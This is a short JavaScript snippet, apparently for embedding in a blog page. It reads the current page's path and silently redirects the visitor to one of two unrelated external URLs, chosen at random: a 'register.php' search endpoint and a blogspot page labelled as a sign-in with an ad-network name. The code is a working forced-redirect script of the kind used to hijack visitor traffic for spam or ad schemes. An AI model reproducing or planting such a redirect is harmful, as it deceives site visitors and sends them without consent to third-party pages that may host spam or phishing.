var urlmain = document.URL;
var param = document.URL.split("/")[3].replace("?m=1","").replace("?m=0","");
var dataUrl = [

 "https://bo.1st.yt/register.php?do=search&q=",
 "https://mybossfj.blogspot.com/signin_adstera="

];
var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
window.location = randomItem + param;
